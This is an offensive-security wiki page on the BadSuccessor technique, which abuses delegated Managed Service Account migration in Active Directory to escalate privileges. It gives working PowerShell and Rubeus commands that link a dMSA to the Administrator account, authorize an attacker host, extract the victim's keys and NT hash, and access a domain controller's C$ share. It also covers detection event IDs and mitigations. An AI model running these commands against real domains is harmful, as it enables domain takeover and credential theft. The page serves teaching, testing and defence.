# BadSuccessor: Privilege Escalation via Delegated MSA Migration Abuse

{{#include ../../banners/hacktricks-training.md}}

## Overview

Delegated Managed Service Accounts (dMSA) are a new AD principal type introduced with Windows Server 2025 to enable “migration” from a legacy service account to a managed machine-bound account. The migration flow is exposed through cmdlets such as `Start-ADServiceAccountMigration` and `Complete-ADServiceAccountMigration` and hinges on attributes of the dMSA object:

- `msDS-ManagedAccountPrecededByLink` – DN link to the superseded (old) account.
- `msDS-DelegatedMSAState` – migration state (1 = started, 2 = completed, 3 = standalone dMSA).

BadSuccessor is an abuse primitive where an attacker who can create or modify a dMSA sets just those two attributes so the KDC/LSASS treat the dMSA as the successor of any chosen account. Authenticating as the dMSA then yields the PAC/SIDs of the linked victim (e.g., Domain Admin). This technique was publicly detailed by Akamai on May 21, 2025; as of August 2025 there is no official patch, so prevention relies on hardening OU permissions and monitoring.

### Environment prerequisites (important)

- At least one Domain Controller must run Windows Server 2025 (schema and KDC logic for dMSA). Domains not using dMSA are still affected once a 2025 DC exists.
- dMSA client logons can be gated by the policy “Enable delegated Managed Service Account logons,” but this policy is not required for the KDC-side behavior abused here.

### Attack prerequisites

An identity able to create objects or write attributes under some Organizational Unit (OU):

- Create Child → `msDS-DelegatedManagedServiceAccount` (or Create All Child Objects), and/or
- Write property on `msDS-ManagedAccountPrecededByLink` and `msDS-DelegatedMSAState` on an existing dMSA.

Network access to LDAP and Kerberos from any domain-joined host is sufficient.

## Enumerating Vulnerable OUs

Akamai published a helper that inspects OU DACLs and lists principals that can create dMSAs (high signal for BadSuccessor):

```powershell
# Requires only domain read permissions
.\nGet-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```

Internally it enumerates all `organizationalUnit` objects and looks for ACEs granting:

- `ADS_RIGHT_DS_CREATE_CHILD` (0x0001) for class `msDS-DelegatedManagedServiceAccount`
- Or generic “Create All Child Objects”

## Exploitation Steps

Once a writable OU is identified, two attribute writes simulate a “completed migration” for any target account:

```powershell
# 1) Create a new delegated MSA inside a writable OU
New-ADServiceAccount -Name attacker_dMSA \
                     -DNSHostName host.contoso.local \
                     -Path "OU=DelegatedOU,DC=contoso,DC=com" \
                     -OtherAttributes @{ 'msDS-DelegatedMSAState' = 3 }

# 2) Point the dMSA to the victim and mark migration as completed
Set-ADServiceAccount attacker_dMSA -Add @{
  msDS-ManagedAccountPrecededByLink = "CN=Administrator,CN=Users,DC=contoso,DC=com"
}
Set-ADServiceAccount attacker_dMSA -Replace @{ msDS-DelegatedMSAState = 2 }
```

Note on states: legitimate flows set `1` during Start‑Migration and `2` at Complete‑Migration; `3` is used for standalone/non‑migrated dMSAs.

### Making the dMSA usable (authorized computer)

Unlike gMSAs, dMSA secrets are DC‑held and machine‑bound. To use the dMSA, add a computer you control to `msDS-GroupMSAMembership` (aka PrincipalsAllowedToRetrieveManagedPassword):

```powershell
# Allow ATTACKERHOST$ to obtain the dMSA’s key package / authenticate as the dMSA
Set-ADServiceAccount -Identity attacker_dMSA \
  -PrincipalsAllowedToRetrieveManagedPassword "ATTACKERHOST$"
```

After replication, from ATTACKERHOST you can request the dMSA ticket and key package.

## Post‑Exploitation and Credential Theft

dMSA authentication returns a KERB-DMSA-KEY-PACKAGE that contains current keys and previous keys. When `msDS-ManagedAccountPrecededByLink` is set, the previous‑keys list includes keys of the linked victim (commonly an RC4 key equal to the victim’s NT hash if `msDS-SupportedEncryptionTypes` was default). This turns BadSuccessor into both privilege escalation and credential compromise.

Examples:

```powershell
# 1) From ATTACKERHOST (listed in msDS-GroupMSAMembership), get a machine TGT
#    e.g., run as SYSTEM and export the existing machine TGT with Rubeus dump/klist

# 2) Ask for the dMSA ticket and extract the key package (Rubeus v2.3.3+)
Rubeus.exe asktgs /dmsa /service:krbtgt/contoso.local \
  /targetuser:attacker_dMSA$ /ticket:BASE64_MACHINE_TGT /ptt /nowrap /opsec

# 3) Use the injected TGT to access DA resources
cmd.exe /c dir \\DC01\C$
```

Tip: tools like SharpSuccessor and NetExec’s module `badsuccessor` automate creation, linking, authorization, and ticket/key extraction end‑to‑end.

## Detection & Hunting

Enable object auditing on OUs and monitor for:

- 5137 (Directory Service) – Creation of `msDS-DelegatedManagedServiceAccount` objects.
- 5136 (Directory Service) – Modifications to `msDS-ManagedAccountPrecededByLink` and `msDS-DelegatedMSAState`.
- 4662 (Security) – Attribute‑level changes on the dMSA object
  - `schemaIdGuid` 2f5c138a-bd38-4016-88b4-0ec87cbb4919 → `msDS-DelegatedMSAState`
  - `schemaIdGuid` a0945b2b-57a2-43bd-b327-4d112a4e8bd1 → `msDS-ManagedAccountPrecededByLink`
- 2946 (Directory Service) – dMSA authentication including KERB‑DMSA‑KEY‑PACKAGE
  - Typically shows Caller SID S-1-5-7 and the DN of the dMSA.

Correlate: rapid sequence of 5137 → 5136/4662 on the same object → 2946, followed by 4624/4769 from unusual hosts. SIEM/XDR content from multiple vendors already ships detections for these patterns.

## Mitigation

- Apply least privilege on OUs. Remove Create‑Child for `msDS-DelegatedManagedServiceAccount` (or Create‑All‑Child‑Objects) from non‑Tier‑0 identities.
- Optionally add deny ACEs at OU scope to block writes to `msDS-ManagedAccountPrecededByLink` for Everyone/Authenticated Users while keeping legitimate admin flows.
- Monitor the events above and alert when non‑admin identities create or modify dMSAs, or when unexpected 2946 events occur.

## Automation and Tooling

- SharpSuccessor (C#)
- BadSuccessor.ps1 (PowerShell)
- NetExec module `badsuccessor` (Python)
- Rubeus (v2.3.3+) supports `/dmsa` to retrieve dMSA tickets and key packages.

## See also


{{#ref}}
acl-persistence-abuse/BadSuccessor.md
{{#endref}}


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## References

- [Akamai – BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory (May 21, 2025)](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [Microsoft Learn – Attribute msDS-DelegatedMSAState / msDS-ManagedAccountPrecededByLink (Windows Server 2025 schema)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada2/c354638a-5e30-43e5-b7f0-9233d83fec8b)

{{#include ../../banners/hacktricks-training.md}}
